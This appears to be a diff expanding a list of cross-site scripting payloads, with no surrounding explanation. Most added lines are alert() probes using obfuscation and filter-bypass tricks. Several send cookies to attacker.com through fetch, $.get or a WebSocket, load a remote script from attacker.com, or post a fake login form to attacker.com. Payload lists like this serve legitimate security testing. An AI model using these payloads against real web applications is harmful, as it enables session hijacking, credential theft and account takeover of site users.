@@ -1,8 +1,89 @@
-"<script>alert('XSS')</script>",
-"<img src='x' onerror='alert(1)'>",
-"'\"><script>alert('XSS')</script>",
-"<svg/onload=alert(1)>",
-"<a href='javascript:alert(1)'>Click me</a>",
-"<iframe src='javascript:alert(1)'></iframe>",
-"\"><img src=x onerror=alert(1)>",
-"<input onfocus=alert(1) autofocus>"
+
+
+<script>alert(1);</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe srcdoc='<script>alert(1)</script>'>
+
+<svg><script>alert('XSS')</script></svg>
+<math><mtext><xmp><script>alert('XSS')</script></xmp></mtext></math>
+<body onload=alert(/XSS/)>
+<input onfocus=alert('XSS') autofocus>
+<details open ontoggle=alert('XSS')>
+
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<script src=//attacker.com/xss.js></script>
+<img src=javascript:alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+
+<textarea onfocus=alert('XSS')>Click me</textarea>
+<marquee onstart=alert('XSS')>XSS</marquee>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>
+
+javascript:document.body.innerHTML='<h1 onclick=alert(`XSS`)>Click</h1>';
+<a href='#' onclick='location=`javascript:alert(1)`'>XSS</a>
+<video src=x onerror=alert('XSS')></video>
+
+<svg/onload=alert(/XSS/)//<svg><script>alert('XSS')</script></svg>
+'><svg/onload=alert('XSS')>
+<div onpointerover=alert('XSS')>Hover me</div>
+
+{"key":"<script>alert('XSS')</script>"}
+{"key":"<img src=x onerror=alert('XSS')>"}
+
+<form action='https://attacker.com'>
+    <input name='username' value='admin'>
+    <input name='password' value='password'>
+    <button type='submit'>Login</button>
+</form>
+
+{{constructor.constructor('alert("XSS")')()}}
+${alert('XSS')}
+
+<button onclick=alert('XSS')>Click Me</button>
+<a href='javascript:alert(1)'>Link</a>
+<img src='#' onmouseover=alert('XSS')>
+
+<img src=x \u006fone\u0072ror=alert(1)>
+<svg><script xlink:href="data:text/javascript,alert(1)"/>
+<a href=j&#97;vascript:alert(1)>Click</a>
+
+<img src=&#120;&#x6f;&#110;&#x65;&#114;&#x72;&#111;&#x72;=alert(1)>
+<svg><script>\u0061lert(1)</script></svg>
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+"<img src=x onerror=setTimeout('al'+'ert(1)',0)>"
+"<body onresize=alert('XSS')>"
+"<select autofocus onchange=alert('XSS')><option>X</option></select>"
+
+"<div data-content='<img src=x onerror=alert(1)>'>Stored Payload</div>"
+"<a title="<svg onload=alert(1)>">Link</a>"
+
+"<iframe src="javascript:document.write('<script>alert(1)<\/script>')"></iframe>"
+"<script>location='javascript:alert(/XSS/)'</script>"
+
+"</style><style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert('XSS')></div>"
+"<style>*{color:red!important}</style><script>alert('CSS Injection XSS')</script>"
+
+"<script nonce=random>alert('XSS')</script>"
+"<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>"
+
+"<svg xmlns="http://www.w3.org/2000/svg"><desc><![CDATA[</desc><script>alert('XSS')//]]></script></svg>"
+"<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>"
+
+"https://victim.com/api?callback=<script>alert('XSS')</script>"
+
+"<img src="http://127.0.0.1:8080/admin"><script>alert('SSRF XSS')</script>"
+
+"<form><input name="src" value="javascript:alert(1)"></form><button onclick="location=src.value">Click Me</button>"
+
+"<div id=target></div><script>let observer=new MutationObserver(()=>alert('XSS'));observer.observe(target,{childList:true});document.getElementById('target').innerHTML='<img src=x onerror=alert(1)>'</script>"
+
+"<script>var ws=new WebSocket('ws://attacker.com');ws.onopen=function(){ws.send(document.cookie)};</script>"
+
+"Object.prototype.payload=()=>alert('XSS');"
+
+"<script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
+"<script>$.get('https://attacker.com', {cookie: document.cookie});</script>"
+
+"<img src=x onerror="setTimeout('alert(1)', 3000)">"
